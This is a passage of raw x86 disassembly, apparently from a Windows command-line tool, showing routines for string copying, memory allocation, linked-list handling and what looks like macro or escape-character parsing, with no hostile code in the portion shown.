  40daea:	pop    ecx
  40daeb:	mov    ecx,DWORD PTR [esi+0xc]
  40daee:	call   0x4047d9
  40daf3:	mov    ecx,DWORD PTR [esi+0x10]
  40daf6:	call   0x4047d9
  40dafb:	mov    esi,DWORD PTR [esi]
  40dafd:	push   edi
  40dafe:	call   DWORD PTR ds:0x43754c
  40db04:	pop    ecx
  40db05:	mov    edi,esi
  40db07:	test   esi,esi
  40db09:	jne    0x40dac7
  40db0b:	pop    edi
  40db0c:	pop    esi
  40db0d:	pop    ebx
  40db0e:	leave  
  40db0f:	ret    
  40db10:	push   ebp
  40db11:	mov    ebp,esp
  40db13:	and    esp,0xfffffff8
  40db16:	sub    esp,0x284
  40db1c:	mov    eax,ds:0x411018
  40db21:	xor    eax,esp
  40db23:	mov    DWORD PTR [esp+0x280],eax
  40db2a:	mov    eax,DWORD PTR [ebp+0x14]
  40db2d:	push   ebx
  40db2e:	mov    DWORD PTR [esp+0x20],eax
  40db32:	mov    eax,DWORD PTR [ebp+0x18]
  40db35:	push   esi
  40db36:	mov    esi,DWORD PTR [ebp+0x24]
  40db39:	push   edi
  40db3a:	mov    DWORD PTR [esp+0x24],eax
  40db3e:	mov    eax,DWORD PTR [ebp+0x1c]
  40db41:	mov    edi,ecx
  40db43:	mov    DWORD PTR [esp+0x30],eax
  40db47:	mov    eax,DWORD PTR [ebp+0x20]
  40db4a:	push   0x2e
  40db4c:	push   DWORD PTR [edi+0x4]
  40db4f:	mov    ebx,edx
  40db51:	mov    DWORD PTR [esp+0x3c],eax
  40db55:	call   DWORD PTR ds:0x43745c
  40db5b:	pop    ecx
  40db5c:	pop    ecx
  40db5d:	test   eax,eax
  40db5f:	jne    0x40db68
  40db61:	xor    eax,eax
  40db63:	jmp    0x40dcb1
  40db68:	lea    ecx,[esp+0x38]
  40db6c:	push   ecx
  40db6d:	push   eax
  40db6e:	push   DWORD PTR [edi+0x4]
  40db71:	mov    edx,0x101
  40db76:	mov    ecx,ebx
  40db78:	call   0x40d49d
  40db7d:	mov    DWORD PTR [esp+0x2c],eax
  40db81:	test   eax,eax
  40db83:	je     0x40db61
  40db85:	lea    ecx,[esp+0x38]
  40db89:	call   0x407253
  40db8e:	mov    DWORD PTR [esi],ebx
  40db90:	mov    esi,DWORD PTR [esp+0x24]
  40db94:	mov    DWORD PTR [esp+0x10],eax
  40db98:	mov    esi,DWORD PTR [esi]
  40db9a:	mov    DWORD PTR [esp+0x14],edx
  40db9e:	test   esi,esi
  40dba0:	je     0x40dbc0
  40dba2:	push   ebx
  40dba3:	push   DWORD PTR [esi+0x4]
  40dba6:	call   DWORD PTR ds:0x437548
  40dbac:	pop    ecx
  40dbad:	pop    ecx
  40dbae:	test   eax,eax
  40dbb0:	je     0x40dbb8
  40dbb2:	mov    esi,DWORD PTR [esi]
  40dbb4:	test   esi,esi
  40dbb6:	jne    0x40dba2
  40dbb8:	test   esi,esi
  40dbba:	je     0x40dbc0
  40dbbc:	and    BYTE PTR [edi+0x8],0xfe
  40dbc0:	mov    dl,BYTE PTR [edi+0x8]
  40dbc3:	and    DWORD PTR [esp+0x20],0x0
  40dbc8:	lea    eax,[esp+0x20]
  40dbcc:	push   eax
  40dbcd:	push   0x0
  40dbcf:	lea    eax,[esp+0x18]
  40dbd3:	push   eax
  40dbd4:	mov    ecx,ebx
  40dbd6:	call   0x40373e
  40dbdb:	mov    ecx,DWORD PTR [esp+0x20]
  40dbdf:	mov    DWORD PTR [esp+0x1c],eax
  40dbe3:	test   ecx,ecx
  40dbe5:	je     0x40dbfd
  40dbe7:	call   0x404a64
  40dbec:	add    DWORD PTR [esp+0x1c],eax
  40dbf0:	lea    ecx,[esp+0x20]
  40dbf4:	call   0x404a82
  40dbf9:	mov    eax,DWORD PTR [esp+0x1c]
  40dbfd:	mov    ecx,DWORD PTR [esp+0x30]
  40dc01:	add    DWORD PTR [ecx],eax
  40dc03:	test   BYTE PTR [edi+0x8],0x10
  40dc07:	mov    eax,DWORD PTR [esp+0x14]
  40dc0b:	mov    ecx,DWORD PTR [esp+0x10]
  40dc0f:	jne    0x40dc30
  40dc11:	cmp    DWORD PTR [ebp+0x10],eax
  40dc14:	jb     0x40dc30
  40dc16:	ja     0x40dc1d
  40dc18:	cmp    DWORD PTR [ebp+0xc],ecx
  40dc1b:	jb     0x40dc30
  40dc1d:	cmp    BYTE PTR ds:0x4216e6,0x0
  40dc24:	je     0x40dc91
  40dc26:	cmp    DWORD PTR [ebp+0xc],ecx
  40dc29:	jne    0x40dc91
  40dc2b:	cmp    DWORD PTR [ebp+0x10],eax
  40dc2e:	jne    0x40dc91
  40dc30:	test   esi,esi
  40dc32:	jne    0x40dc6e
  40dc34:	call   0x40dcc8
  40dc39:	mov    ecx,ebx
  40dc3b:	mov    esi,eax
  40dc3d:	call   0x40dd18
  40dc42:	mov    DWORD PTR [esi+0x4],eax
  40dc45:	mov    eax,DWORD PTR [esp+0x28]
  40dc49:	mov    edx,eax
  40dc4b:	mov    ecx,DWORD PTR [eax]
  40dc4d:	jmp    0x40dc53
  40dc4f:	mov    edx,ecx
  40dc51:	mov    ecx,DWORD PTR [edx]
  40dc53:	test   ecx,ecx
  40dc55:	jne    0x40dc4f
  40dc57:	mov    ecx,DWORD PTR [esp+0x24]
  40dc5b:	mov    DWORD PTR [edx],esi
  40dc5d:	cmp    DWORD PTR [ecx],0x0
  40dc60:	jne    0x40dc66
  40dc62:	mov    eax,DWORD PTR [eax]
  40dc64:	mov    DWORD PTR [ecx],eax
  40dc66:	mov    ecx,DWORD PTR [esp+0x10]
  40dc6a:	mov    eax,DWORD PTR [esp+0x14]
  40dc6e:	mov    dl,BYTE PTR [edi+0x8]
  40dc71:	test   dl,0x1
  40dc74:	je     0x40dc91
  40dc76:	test   dl,0x10
  40dc79:	jne    0x40dc91
  40dc7b:	push   DWORD PTR [edi+0x4]
  40dc7e:	push   ebx
  40dc7f:	push   0x3
  40dc81:	call   0x4050f7
  40dc86:	mov    eax,DWORD PTR [esp+0x20]
  40dc8a:	mov    ecx,DWORD PTR [esp+0x1c]
  40dc8e:	add    esp,0xc
  40dc91:	mov    ebx,DWORD PTR [esp+0x34]
  40dc95:	mov    esi,DWORD PTR [ebx+0x4]
  40dc98:	mov    edx,DWORD PTR [ebx]
  40dc9a:	cmp    esi,eax
  40dc9c:	jb     0x40dca4
  40dc9e:	ja     0x40dca8
  40dca0:	cmp    edx,ecx
  40dca2:	ja     0x40dca8
  40dca4:	mov    edx,ecx
  40dca6:	mov    esi,eax
  40dca8:	mov    eax,DWORD PTR [esp+0x2c]
  40dcac:	mov    DWORD PTR [ebx],edx
  40dcae:	mov    DWORD PTR [ebx+0x4],esi
  40dcb1:	mov    ecx,DWORD PTR [esp+0x28c]
  40dcb8:	pop    edi
  40dcb9:	pop    esi
  40dcba:	pop    ebx
  40dcbb:	xor    ecx,esp
  40dcbd:	call   0x40fd0b
  40dcc2:	mov    esp,ebp
  40dcc4:	pop    ebp
  40dcc5:	ret    0x20
  40dcc8:	mov    ecx,DWORD PTR ds:0x43265c
  40dcce:	push   esi
  40dccf:	test   ecx,ecx
  40dcd1:	je     0x40dcdc
  40dcd3:	mov    eax,DWORD PTR [ecx]
  40dcd5:	mov    ds:0x43265c,eax
  40dcda:	jmp    0x40dd0d
  40dcdc:	mov    esi,DWORD PTR ds:0x435664
  40dce2:	cmp    esi,0x8
  40dce5:	jae    0x40dcf5
  40dce7:	mov    esi,0x8000
  40dcec:	mov    ecx,esi
  40dcee:	call   0x40a2fb
  40dcf3:	jmp    0x40dcfa
  40dcf5:	mov    eax,ds:0x435660
  40dcfa:	mov    ecx,eax
  40dcfc:	add    eax,0x8
  40dcff:	sub    esi,0x8
  40dd02:	mov    ds:0x435660,eax
  40dd07:	mov    DWORD PTR ds:0x435664,esi
  40dd0d:	and    DWORD PTR [ecx],0x0
  40dd10:	and    DWORD PTR [ecx+0x4],0x0
  40dd14:	mov    eax,ecx
  40dd16:	pop    esi
  40dd17:	ret    
  40dd18:	push   ebx
  40dd19:	push   esi
  40dd1a:	push   edi
  40dd1b:	mov    ebx,ecx
  40dd1d:	mov    edi,ebx
  40dd1f:	push   0x2
  40dd21:	lea    ecx,[edi+0x2]
  40dd24:	pop    edx
  40dd25:	mov    ax,WORD PTR [edi]
  40dd28:	add    edi,edx
  40dd2a:	test   ax,ax
  40dd2d:	jne    0x40dd25
  40dd2f:	sub    edi,ecx
  40dd31:	sar    edi,1
  40dd33:	inc    edi
  40dd34:	xor    ecx,ecx
  40dd36:	mov    eax,edi
  40dd38:	mul    edx
  40dd3a:	seto   cl
  40dd3d:	neg    ecx
  40dd3f:	or     ecx,eax
  40dd41:	call   0x40a2fb
  40dd46:	lea    ecx,[edi+edi*1]
  40dd49:	push   ecx
  40dd4a:	mov    esi,eax
  40dd4c:	push   ebx
  40dd4d:	push   esi
  40dd4e:	call   0x41047c
  40dd53:	add    esp,0xc
  40dd56:	mov    eax,esi
  40dd58:	pop    edi
  40dd59:	pop    esi
  40dd5a:	pop    ebx
  40dd5b:	ret    
  40dd5c:	push   ebp
  40dd5d:	mov    ebp,esp
  40dd5f:	push   ecx
  40dd60:	push   ebx
  40dd61:	push   esi
  40dd62:	mov    eax,ecx
  40dd64:	push   edi
  40dd65:	mov    ebx,eax
  40dd67:	push   0x2
  40dd69:	mov    DWORD PTR [ebp-0x4],eax
  40dd6c:	lea    ecx,[ebx+0x2]
  40dd6f:	pop    edx
  40dd70:	mov    ax,WORD PTR [ebx]
  40dd73:	add    ebx,edx
  40dd75:	test   ax,ax
  40dd78:	jne    0x40dd70
  40dd7a:	sub    ebx,ecx
  40dd7c:	sar    ebx,1
  40dd7e:	xor    ecx,ecx
  40dd80:	lea    eax,[ebx+0x3]
  40dd83:	mul    edx
  40dd85:	seto   cl
  40dd88:	neg    ecx
  40dd8a:	or     ecx,eax
  40dd8c:	call   0x40a2fb
  40dd91:	push   0x22
  40dd93:	mov    edi,eax
  40dd95:	pop    eax
  40dd96:	lea    esi,[ebx+ebx*1]
  40dd99:	push   esi
  40dd9a:	push   DWORD PTR [ebp-0x4]
  40dd9d:	lea    ecx,[edi+0x2]
  40dda0:	push   ecx
  40dda1:	mov    WORD PTR [edi],ax
  40dda4:	call   0x41047c
  40dda9:	add    esp,0xc
  40ddac:	push   0x22
  40ddae:	pop    eax
  40ddaf:	mov    WORD PTR [esi+edi*1+0x2],ax
  40ddb4:	xor    eax,eax
  40ddb6:	mov    WORD PTR [edi+ebx*2+0x4],ax
  40ddbb:	mov    eax,edi
  40ddbd:	pop    edi
  40ddbe:	pop    esi
  40ddbf:	pop    ebx
  40ddc0:	leave  
  40ddc1:	ret    
  40ddc2:	push   ebp
  40ddc3:	mov    ebp,esp
  40ddc5:	push   ecx
  40ddc6:	push   ebx
  40ddc7:	mov    ebx,ecx
  40ddc9:	push   esi
  40ddca:	mov    esi,ebx
  40ddcc:	push   edi
  40ddcd:	mov    DWORD PTR [ebp-0x4],edx
  40ddd0:	lea    ecx,[esi+0x2]
  40ddd3:	xor    edi,edi
  40ddd5:	mov    ax,WORD PTR [esi]
  40ddd8:	add    esi,0x2
  40dddb:	cmp    ax,di
  40ddde:	jne    0x40ddd5
  40dde0:	sub    esi,ecx
  40dde2:	mov    ecx,edx
  40dde4:	sar    esi,1
  40dde6:	lea    edx,[ecx+0x2]
  40dde9:	mov    ax,WORD PTR [ecx]
  40ddec:	add    ecx,0x2
  40ddef:	cmp    ax,di
  40ddf2:	jne    0x40dde9
  40ddf4:	sub    ecx,edx
  40ddf6:	sar    ecx,1
  40ddf8:	lea    edi,[esi+0x1]
  40ddfb:	add    edi,ecx
  40ddfd:	mov    edx,edi
  40ddff:	mov    ecx,ebx
  40de01:	call   0x40f994
  40de06:	push   DWORD PTR [ebp-0x4]
  40de09:	mov    esi,eax
  40de0b:	push   edi
  40de0c:	push   esi
  40de0d:	call   DWORD PTR ds:0x4373d4
  40de13:	add    esp,0xc
  40de16:	mov    eax,esi
  40de18:	pop    edi
  40de19:	pop    esi
  40de1a:	pop    ebx
  40de1b:	leave  
  40de1c:	ret    
  40de1d:	push   esi
  40de1e:	push   edi
  40de1f:	mov    edi,ecx
  40de21:	xor    esi,esi
  40de23:	jmp    0x40de43
  40de25:	cmp    ax,0x2f
  40de29:	jne    0x40de30
  40de2b:	push   0x5c
  40de2d:	pop    eax
  40de2e:	jmp    0x40de3b
  40de30:	push   eax
  40de31:	call   DWORD PTR ds:0x43740c
  40de37:	pop    ecx
  40de38:	movzx  eax,ax
  40de3b:	movzx  eax,ax
  40de3e:	add    esi,eax
  40de40:	add    edi,0x2
  40de43:	movzx  eax,WORD PTR [edi]
  40de46:	test   ax,ax
  40de49:	jne    0x40de25
  40de4b:	and    esi,0x7f
  40de4e:	pop    edi
  40de4f:	mov    eax,esi
  40de51:	pop    esi
  40de52:	ret    0x4
  40de55:	push   ebp
  40de56:	mov    ebp,esp
  40de58:	push   ecx
  40de59:	push   ebx
  40de5a:	push   esi
  40de5b:	push   edi
  40de5c:	mov    edi,ecx
  40de5e:	xor    ebx,ebx
  40de60:	mov    BYTE PTR [ebp-0x1],bl
  40de63:	cmp    WORD PTR [edi],bx
  40de66:	je     0x40dfdc
  40de6c:	push   ecx
  40de6d:	call   0x40de1d
  40de72:	push   eax
  40de73:	mov    ecx,edi
  40de75:	call   0x40f728
  40de7a:	test   eax,eax
  40de7c:	jne    0x40dfde
  40de82:	mov    esi,DWORD PTR ds:0x437478
  40de88:	push   0x2
  40de8a:	pop    eax
  40de8b:	push   eax
  40de8c:	push   0x402690
  40de91:	push   edi
  40de92:	call   esi
  40de94:	add    esp,0xc
  40de97:	test   eax,eax
  40de99:	je     0x40defb
  40de9b:	push   0x2
  40de9d:	push   0x402698
  40dea2:	push   edi
  40dea3:	call   esi
  40dea5:	add    esp,0xc
  40dea8:	test   eax,eax
  40deaa:	je     0x40defb
  40deac:	mov    esi,edi
  40deae:	push   0x2
  40deb0:	lea    ecx,[esi+0x2]
  40deb3:	pop    edx
  40deb4:	mov    ax,WORD PTR [esi]
  40deb7:	add    esi,edx
  40deb9:	cmp    ax,bx
  40debc:	jne    0x40deb4
  40debe:	sub    esi,ecx
  40dec0:	sar    esi,1
  40dec2:	add    esi,0x3
  40dec5:	xor    ecx,ecx
  40dec7:	mov    eax,esi
  40dec9:	mul    edx
  40decb:	seto   cl
  40dece:	neg    ecx
  40ded0:	or     ecx,eax
  40ded2:	call   0x40a2fb
  40ded7:	push   0x402690
  40dedc:	mov    ebx,eax
  40dede:	push   esi
  40dedf:	push   ebx
  40dee0:	call   DWORD PTR ds:0x4373d0
  40dee6:	add    esp,0xc
  40dee9:	push   edi
  40deea:	push   esi
  40deeb:	push   ebx
  40deec:	call   DWORD PTR ds:0x4373d4
  40def2:	add    esp,0xc
  40def5:	mov    BYTE PTR [ebp-0x1],0x1
  40def9:	jmp    0x40defe
  40defb:	lea    ebx,[edi+0x4]
  40defe:	push   ecx
  40deff:	mov    ecx,ebx
  40df01:	call   0x40de1d
  40df06:	push   eax
  40df07:	mov    ecx,ebx
  40df09:	call   0x40f728
  40df0e:	mov    esi,eax
  40df10:	test   esi,esi
  40df12:	je     0x40df29
  40df14:	cmp    BYTE PTR [ebp-0x1],0x0
  40df18:	je     0x40df22
  40df1a:	push   ebx
  40df1b:	call   DWORD PTR ds:0x43754c
  40df21:	pop    ecx
  40df22:	mov    eax,esi
  40df24:	jmp    0x40dfde
  40df29:	lea    eax,[edi+0x4]
  40df2c:	cmp    ebx,eax
  40df2e:	je     0x40df37
  40df30:	push   0x2f
  40df32:	pop    eax
  40df33:	mov    WORD PTR [ebx+0x2],ax
  40df37:	push   ecx
  40df38:	mov    ecx,ebx
  40df3a:	call   0x40de1d
  40df3f:	push   eax
  40df40:	mov    ecx,ebx
  40df42:	call   0x40f728
  40df47:	cmp    BYTE PTR [ebp-0x1],0x0
  40df4b:	mov    esi,eax
  40df4d:	je     0x40df57
  40df4f:	push   ebx
  40df50:	call   DWORD PTR ds:0x43754c
  40df56:	pop    ecx
  40df57:	test   esi,esi
  40df59:	jne    0x40df22
  40df5b:	cmp    WORD PTR [edi],0x22
  40df5f:	jne    0x40df6c
  40df61:	mov    ecx,edi
  40df63:	call   0x40f8e1
  40df68:	mov    ebx,eax
  40df6a:	jmp    0x40dfc5
  40df6c:	mov    esi,edi
  40df6e:	push   0x2
  40df70:	lea    ecx,[esi+0x2]
  40df73:	xor    edx,edx
  40df75:	pop    ebx
  40df76:	mov    ax,WORD PTR [esi]
  40df79:	add    esi,ebx
  40df7b:	cmp    ax,dx
  40df7e:	jne    0x40df76
  40df80:	sub    esi,ecx
  40df82:	sar    esi,1
  40df84:	add    esi,0x3
  40df87:	xor    ecx,ecx
  40df89:	mov    eax,esi
  40df8b:	mul    ebx
  40df8d:	seto   cl
  40df90:	neg    ecx
  40df92:	or     ecx,eax
  40df94:	call   0x40a2fb
  40df99:	push   0x401098
  40df9e:	mov    ebx,eax
  40dfa0:	push   esi
  40dfa1:	push   ebx
  40dfa2:	call   DWORD PTR ds:0x4373d0
  40dfa8:	add    esp,0xc
  40dfab:	push   edi
  40dfac:	mov    edi,DWORD PTR ds:0x4373d4
  40dfb2:	push   esi
  40dfb3:	push   ebx
  40dfb4:	call   edi
  40dfb6:	add    esp,0xc
  40dfb9:	push   0x401098
  40dfbe:	push   esi
  40dfbf:	push   ebx
  40dfc0:	call   edi
  40dfc2:	add    esp,0xc
  40dfc5:	push   ecx
  40dfc6:	mov    ecx,ebx
  40dfc8:	call   0x40de1d
  40dfcd:	push   eax
  40dfce:	mov    ecx,ebx
  40dfd0:	call   0x40f728
  40dfd5:	mov    esi,eax
  40dfd7:	jmp    0x40df1a
  40dfdc:	xor    eax,eax
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x8
  40dfe5:	push   ebp
  40dfe6:	mov    ebp,esp
  40dfe8:	sub    esp,0x230
  40dfee:	mov    eax,ds:0x411018
  40dff3:	xor    eax,ebp
  40dff5:	mov    DWORD PTR [ebp-0x4],eax
  40dff8:	push   ebx
  40dff9:	mov    eax,edx
  40dffb:	push   esi
  40dffc:	mov    esi,DWORD PTR [ebp+0x8]
  40dfff:	mov    ebx,ecx
  40e001:	xor    ecx,ecx
  40e003:	push   edi
  40e004:	mov    DWORD PTR [ebp-0x224],eax
  40e00a:	mov    DWORD PTR [ebp-0x220],esi
  40e010:	mov    dl,cl
  40e012:	test   eax,eax
  40e014:	je     0x40e042
  40e016:	test   esi,esi
  40e018:	je     0x40e01e
  40e01a:	mov    eax,DWORD PTR [esi]
  40e01c:	jmp    0x40e044
  40e01e:	mov    eax,DWORD PTR [eax]
  40e020:	mov    DWORD PTR [ebp-0x21c],eax
  40e026:	mov    DWORD PTR [ebp-0x218],eax
  40e02c:	test   eax,eax
  40e02e:	je     0x40e050
  40e030:	cmp    DWORD PTR [eax],ecx
  40e032:	je     0x40e050
  40e034:	mov    eax,DWORD PTR [eax]
  40e036:	mov    DWORD PTR [ebp-0x218],eax
  40e03c:	cmp    DWORD PTR [eax],ecx
  40e03e:	jne    0x40e034
  40e040:	jmp    0x40e04a
  40e042:	mov    eax,ecx
  40e044:	mov    DWORD PTR [ebp-0x218],eax
  40e04a:	mov    DWORD PTR [ebp-0x21c],eax
  40e050:	cmp    WORD PTR [ebx],cx
  40e053:	je     0x40e49e
  40e059:	mov    DWORD PTR [ebp-0x228],0x5e
  40e063:	xor    edi,edi
  40e065:	movzx  ecx,WORD PTR [ebx]
  40e068:	push   0x24
  40e06a:	pop    esi
  40e06b:	test   cx,cx
  40e06e:	je     0x40e498
  40e074:	push   0x22
  40e076:	pop    eax
  40e077:	cmp    cx,si
  40e07a:	je     0x40e0a8
  40e07c:	cmp    cx,ax
  40e07f:	jne    0x40e086
  40e081:	test   dl,dl
  40e083:	sete   dl
  40e086:	test   dl,dl
  40e088:	jne    0x40e09d
  40e08a:	cmp    cx,WORD PTR [ebp-0x228]
  40e091:	jne    0x40e09d
  40e093:	add    ebx,0x2
  40e096:	cmp    WORD PTR [ebx],ax
  40e099:	jne    0x40e09d
  40e09b:	inc    dl
  40e09d:	add    ebx,0x2
  40e0a0:	movzx  ecx,WORD PTR [ebx]
  40e0a3:	test   cx,cx
  40e0a6:	jne    0x40e077
  40e0a8:	mov    eax,DWORD PTR [ebp-0x21c]
  40e0ae:	mov    BYTE PTR [ebp-0x211],dl
  40e0b4:	cmp    WORD PTR [ebx],di
  40e0b7:	je     0x40e498
  40e0bd:	add    ebx,0x2
  40e0c0:	cmp    WORD PTR [ebx],di
  40e0c3:	jne    0x40e0e1
  40e0c5:	test   BYTE PTR [ebp+0x18],0x4
  40e0c9:	jne    0x40e462
  40e0cf:	push   0x3ea
  40e0d4:	push   DWORD PTR ds:0x4216e0
  40e0da:	call   0x405021
  40e0df:	pop    ecx
  40e0e0:	pop    ecx
  40e0e1:	cmp    BYTE PTR [ebp-0x211],0x0
  40e0e8:	jne    0x40e122
  40e0ea:	push   0x5e
  40e0ec:	pop    eax
  40e0ed:	cmp    WORD PTR [ebx],ax
  40e0f0:	jne    0x40e122
  40e0f2:	add    ebx,0x2
  40e0f5:	mov    cx,WORD PTR [ebx]
  40e0f8:	call   0x40358a
  40e0fd:	test   al,al
  40e0ff:	jne    0x40e10b
  40e101:	test   BYTE PTR [ebp+0x18],0x4
  40e105:	jne    0x40e472
  40e10b:	movzx  eax,WORD PTR [ebx]
  40e10e:	push   eax
  40e10f:	push   0x3e9
  40e114:	push   DWORD PTR ds:0x4216e0
  40e11a:	call   0x405021
  40e11f:	add    esp,0xc
  40e122:	movzx  eax,WORD PTR [ebx]
  40e125:	cmp    ax,si
  40e128:	jne    0x40e144
  40e12a:	mov    ecx,ebx
  40e12c:	call   0x40e584
  40e131:	mov    ebx,eax
  40e133:	mov    eax,DWORD PTR [ebp-0x218]
  40e139:	mov    DWORD PTR [ebp-0x21c],eax
  40e13f:	jmp    0x40e448
  40e144:	cmp    eax,0x28
  40e147:	jne    0x40e1df
  40e14d:	lea    ecx,[ebx+0x2]
  40e150:	lea    edx,[ebp-0x210]
  40e156:	call   0x40e4bd
  40e15b:	push   DWORD PTR [ebp-0x210]
  40e161:	mov    ebx,eax
  40e163:	push   0x4015a8
  40e168:	call   DWORD PTR ds:0x437540
  40e16e:	pop    ecx
  40e16f:	pop    ecx
  40e170:	test   eax,eax
  40e172:	je     0x40e278
  40e178:	cmp    BYTE PTR ds:0x435674,0x0
  40e17f:	je     0x40e133
  40e181:	test   BYTE PTR ds:0x4114bc,0x40
  40e188:	jne    0x40e133
  40e18a:	lea    esi,[ebp-0x210]
  40e190:	lea    ecx,[esi+0x2]
  40e193:	mov    ax,WORD PTR [esi]
  40e196:	add    esi,0x2
  40e199:	cmp    ax,di
  40e19c:	jne    0x40e193
  40e19e:	sub    esi,ecx
  40e1a0:	sar    esi,1
  40e1a2:	add    esi,0x4
  40e1a5:	lea    eax,[esi+esi*1]
  40e1a8:	call   0x410420
  40e1ad:	mov    edi,esp
  40e1af:	lea    eax,[ebp-0x210]
  40e1b5:	push   eax
  40e1b6:	push   0x4026a0
  40e1bb:	push   esi
  40e1bc:	push   edi
  40e1bd:	call   DWORD PTR ds:0x43748c
  40e1c3:	push   DWORD PTR ds:0x435678
  40e1c9:	push   edi
  40e1ca:	push   0x44c
  40e1cf:	xor    edi,edi
  40e1d1:	push   edi
  40e1d2:	call   0x405021
  40e1d7:	add    esp,0x20
  40e1da:	jmp    0x40e278
  40e1df:	push   eax
  40e1e0:	push   0x4015a8
  40e1e5:	call   DWORD PTR ds:0x437540
  40e1eb:	pop    ecx
  40e1ec:	pop    ecx
  40e1ed:	test   eax,eax
  40e1ef:	je     0x40e23d
  40e1f1:	cmp    BYTE PTR ds:0x435674,0x0
  40e1f8:	je     0x40e133
  40e1fe:	test   BYTE PTR ds:0x4114bc,0x40
  40e205:	jne    0x40e133
  40e20b:	movzx  eax,WORD PTR [ebx]
  40e20e:	cmp    eax,0x3c
  40e211:	je     0x40e133
  40e217:	push   DWORD PTR ds:0x435678
  40e21d:	mov    WORD PTR [ebp-0xa],ax
  40e221:	xor    eax,eax
  40e223:	mov    WORD PTR [ebp-0x8],ax
  40e227:	lea    eax,[ebp-0xc]
  40e22a:	push   eax
  40e22b:	push   0x44c
  40e230:	push   edi
  40e231:	mov    WORD PTR [ebp-0xc],si
  40e235:	call   0x405021
  40e23a:	add    esp,0x10
  40e23d:	mov    cx,WORD PTR [ebx]
  40e240:	call   0x40358a
  40e245:	test   al,al
  40e247:	jne    0x40e265
  40e249:	test   BYTE PTR [ebp+0x18],0x4
  40e24d:	jne    0x40e472
  40e253:	push   0x3ea
  40e258:	push   DWORD PTR ds:0x4216e0
  40e25e:	call   0x405021
  40e263:	pop    ecx
  40e264:	pop    ecx
  40e265:	mov    ax,WORD PTR [ebx]
  40e268:	mov    WORD PTR [ebp-0x210],ax
  40e26f:	xor    eax,eax
  40e271:	mov    WORD PTR [ebp-0x20e],ax
  40e278:	cmp    DWORD PTR [ebp-0x224],0x0
  40e27f:	je     0x40e28a
  40e281:	call   0x40dcc8
  40e286:	mov    esi,eax
  40e288:	jmp    0x40e2a6
  40e28a:	mov    ecx,0x4010a4
  40e28f:	mov    DWORD PTR [ebp-0x230],edi
  40e295:	call   0x40dd18
  40e29a:	mov    DWORD PTR [ebp-0x22c],eax
  40e2a0:	lea    esi,[ebp-0x230]
  40e2a6:	lea    ecx,[ebp-0x210]
  40e2ac:	call   0x40a26b
  40e2b1:	mov    edi,eax
  40e2b3:	test   edi,edi
  40e2b5:	je     0x40e35c
  40e2bb:	cmp    DWORD PTR [ebp+0xc],0x0
  40e2bf:	je     0x40e322
  40e2c1:	mov    ecx,DWORD PTR [ebp+0xc]
  40e2c4:	lea    edx,[ebp-0x210]
  40e2ca:	mov    ax,WORD PTR [ecx]
  40e2cd:	cmp    ax,WORD PTR [edx]
  40e2d0:	jne    0x40e2f0
  40e2d2:	test   ax,ax
  40e2d5:	je     0x40e2ec
  40e2d7:	mov    ax,WORD PTR [ecx+0x2]
  40e2db:	cmp    ax,WORD PTR [edx+0x2]
  40e2df:	jne    0x40e2f0
  40e2e1:	add    ecx,0x4
  40e2e4:	add    edx,0x4
  40e2e7:	test   ax,ax
  40e2ea:	jne    0x40e2ca
  40e2ec:	xor    eax,eax
  40e2ee:	jmp    0x40e2f5
  40e2f0:	sbb    eax,eax
  40e2f2:	or     eax,0x1
  40e2f5:	test   eax,eax
  40e2f7:	jne    0x40e322
  40e2f9:	mov    edx,DWORD PTR [ebp+0x10]
  40e2fc:	mov    eax,DWORD PTR [edi+0x8]
  40e2ff:	mov    ecx,edx
  40e301:	cmp    edx,DWORD PTR [ebp+0x14]
  40e304:	je     0x40e312
  40e306:	test   eax,eax
  40e308:	je     0x40e316
  40e30a:	mov    eax,DWORD PTR [eax]
  40e30c:	dec    ecx
  40e30d:	cmp    ecx,DWORD PTR [ebp+0x14]
  40e310:	jne    0x40e306
  40e312:	test   eax,eax
  40e314:	jne    0x40e356
  40e316:	mov    ecx,0x401668
  40e31b:	call   0x40dd18
  40e320:	jmp    0x40e359
  40e322:	mov    al,BYTE PTR [edi+0xc]
  40e325:	test   al,0x1
  40e327:	je     0x40e34f
  40e329:	test   BYTE PTR [ebp+0x18],0x4
  40e32d:	jne    0x40e484
  40e333:	lea    eax,[ebp-0x210]
  40e339:	push   eax
  40e33a:	push   0x42e
  40e33f:	push   DWORD PTR ds:0x4216e0
  40e345:	call   0x405021
  40e34a:	add    esp,0xc
  40e34d:	jmp    0x40e35c
  40e34f:	test   al,0x10
  40e351:	jne    0x40e316
  40e353:	mov    eax,DWORD PTR [edi+0x8]
  40e356:	mov    eax,DWORD PTR [eax+0x4]
  40e359:	mov    DWORD PTR [esi+0x4],eax
  40e35c:	mov    ecx,DWORD PTR [ebp-0x224]
  40e362:	test   ecx,ecx
  40e364:	je     0x40e3a0
  40e366:	test   edi,edi
  40e368:	je     0x40e370
  40e36a:	test   BYTE PTR [edi+0xc],0x10
  40e36e:	je     0x40e383
  40e370:	mov    ecx,0x401668
  40e375:	call   0x40dd18
  40e37a:	mov    ecx,DWORD PTR [ebp-0x224]
  40e380:	mov    DWORD PTR [esi+0x4],eax
  40e383:	and    DWORD PTR [esi],0x0
  40e386:	mov    eax,DWORD PTR [ebp-0x218]
  40e38c:	test   eax,eax
  40e38e:	je     0x40e394
  40e390:	mov    DWORD PTR [eax],esi
  40e392:	jmp    0x40e396
  40e394:	mov    DWORD PTR [ecx],esi
  40e396:	mov    eax,esi
  40e398:	mov    DWORD PTR [ebp-0x218],eax
  40e39e:	jmp    0x40e3a6
  40e3a0:	mov    eax,DWORD PTR [ebp-0x218]
  40e3a6:	mov    DWORD PTR [ebp-0x21c],eax
  40e3ac:	test   edi,edi
  40e3ae:	je     0x40e446
  40e3b4:	push   0x24
  40e3b6:	push   DWORD PTR [esi+0x4]
  40e3b9:	call   DWORD PTR ds:0x437540
  40e3bf:	pop    ecx
  40e3c0:	pop    ecx
  40e3c1:	test   eax,eax
  40e3c3:	je     0x40e45b
  40e3c9:	or     BYTE PTR [edi+0xc],0x1
  40e3cd:	cmp    DWORD PTR [ebp+0xc],0x0
  40e3d1:	je     0x40e40e
  40e3d3:	mov    eax,DWORD PTR [ebp+0xc]
  40e3d6:	lea    ecx,[ebp-0x210]
  40e3dc:	mov    dx,WORD PTR [eax]
  40e3df:	cmp    dx,WORD PTR [ecx]
  40e3e2:	jne    0x40e402
  40e3e4:	test   dx,dx
  40e3e7:	je     0x40e3fe
  40e3e9:	mov    dx,WORD PTR [eax+0x2]
